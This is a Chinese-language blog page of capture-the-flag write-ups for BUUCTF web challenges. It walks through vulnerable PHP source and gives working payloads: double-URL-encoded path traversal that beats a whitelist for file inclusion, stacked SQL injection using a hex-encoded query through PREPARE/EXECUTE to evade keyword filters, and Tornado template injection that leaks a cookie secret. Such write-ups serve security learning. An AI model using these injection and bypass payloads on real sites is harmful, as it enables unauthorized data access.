---
layout: page
title: "BUUCTF-WEB-WriteUp"
date: 2019-10-10 01:01
---

## [HCTF 2018]WarmUp
打开网址显示一个滑稽 查看源码提示`source.php`
- 打开/source.php 查看源码

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

- class emmm中checkFile中有一段

```php
$whitelist = ["source"=>"source.php","hint"=>"hint.php"];
```

访问hint.php
显示`flag not here, and flag in ffffllllaaaagggg`
- 回去看source.php源码

```php
if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    }
```

当满足三个条件 file值不为空 file值为字符串 checkFile为真 执行file `任意文件包含`
- 前两个条件容易满足 关键checkFile返回真
此函数有多处返回真代码 可以利用的代码片段是两处
- 第一处利用代码

```php
 $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
```
这一段代码条件满足字符串中`?`之前的字符串在whitelist中也就是source.php或hint.php后面紧跟../包含ffffllllaaaagggg
经测试需要四层../../../../
构造payload`?file=source.php?/../../../../ffffllllaaaagggg`或`?file=hint.php?/../../../../ffffllllaaaagggg`
- 第二处利用代码

```php

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
```

字符串经过一次url解码 在进行同上步骤 所以`?`两次url编码为`%253f`
构造payload`?file=source.php%253f/../../../../ffffllllaaaagggg`或`?file=hint.php%253f/../../../../ffffllllaaaagggg`
- flag{2d960f01-7d02-446e-9888-d9a08d6f266a}

## [强网杯 2019]随便注
一道SQL注入题目
堆叠注入题目(堆叠注入就是将一堆sql语句叠加在一起执行，使用分号结束上一个语句再叠加其他语句一起执行)
- `1'#`有回显 说明参数使用单引号闭合
- 紧接着确定有多少列`1' order by 2#`有回显 `1' order by 3#`报错 确定两列
- union查一下`1' union select 1,2#` 显示`return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`存在关键字过滤
- 这时我们就只能试一下堆叠注入`1'; show databases#` 爆出一堆数据库 不知该下手哪一个
- 爆一下表`1'; show tables#` 两个表`1919810931114514`和`words`
- 爆一下两个表的列

```
1';desc `1919810931114514`;#
1';desc `words`;#
```

回显证明1919810931114514表是有flag列
- 没法用select直接获取flag 利用预处理 set用大小绕过
```
SET @sql = sql语句;  //设置变量
PREPARE yuchuli from @sql;   //预定义SQL语句
EXECUTE yuchuli;  //执行预定义SQL语句sqla
```
- 构造payload

```
SET @sql = select * from `1919810931114514`;
PREPARE yuchuli from @sql; 
EXECUTE yuchuli;
```
由于select被过滤 可以用0x编码sql语句
最终payload
```
1';SET @sql = 0x73656C656374202A2066726F6D20603139313938313039333131313435313460;
PREPARE yuchuli from @sql; 
EXECUTE yuchuli;#
```
- flag{2a64100c-3609-4340-99ce-a18b818d9d23}

## easy_tornado
- 打开网页显示

```
/flag.txt
/welcome.txt
/hints.txt
```
打开分别回显及对应url
```
flag in /fllllllllllllag    /file?filename=/flag.txt&filehash=1de1224fd807cf95a218e546956e98c2
render                      /file?filename=/welcome.txt&filehash=eac6557dcd24438b369890a4f2d1059a
md5(cookie_secret+md5(filename))    file?filename=/hints.txt&filehash=cf83e929dfd5900716ae2e9c2a64e715
```
- 试一下`file?filename=/fllllllllllllag&filehash=cf83e929dfd5900716ae2e9c2a64e715`报错ERROR 并且url`error?msg=Error`
- tornado框架存在handler.settings尝试`/error?msg={{handler.settings}}`
得到cookie`459f40bc-9132-48a7-a82e-9409e8d51a00`
- 根据md5(cookie_secret+md5(filename))得到filehash`97582610e7ca4534ab0858894d38a167`
- 构造payload`/file?filename=/fllllllllllllag&filehash=97582610e7ca4534ab0858894d38a167`回显flag
- flag{62662099-e484-4bd1-9ff0-7e55496fd9b1}

## [强网杯 2019]高明的黑客
下载的压缩文件 3002个php文件 打开都是垃圾代码
本题是fuzz 

## [SUCTF 2019]EasySQL
sql注入
- 输入0无回显 输入非0回显`Array ( [0] => 1 )` 输入flag回显`Nonono.`
- 输入`1'`无回显
- 堆叠注入爆表`1;show tables#`回显`Array ( [0] => 1 ) Array ( [0] => Flag )`
- 综上述判断内置的sql语句`select 输入的数据||内置的一个列名 from 表名`进一步判定`select post_data || flag from Flag`
- 这里有两种解法
第一种
```
第一种这里对字符过滤有所疏忽  譬如*就没有过滤 所以 注入`*,1` sql语句拼接成`select *,1 || flag from Flag`也就是`select *,1 from Flag`
回显`Array ( [0] => flag{3536a21c-ca9e-44ca-888b-75357b6df1c0} [1] => 1 )`
```
第二种
```
第二种才是预期解法使用`set sql_mode=pipes_as_concat;`将||变成字符串拼接而不是or 注入`1;set sql_mode=pipes_as_concat;select 1`sql语句拼接成`select 1;set sql_mode=pipes_as_concat;select 1 || flag from Flag` 其中`select 1 || flag from Flag`是将1与flag输出内容就行拼接 
回显`Array ( [0] => 1 ) Array ( [0] => 1flag{3536a21c-ca9e-44ca-888b-75357b6df1c0} )`
```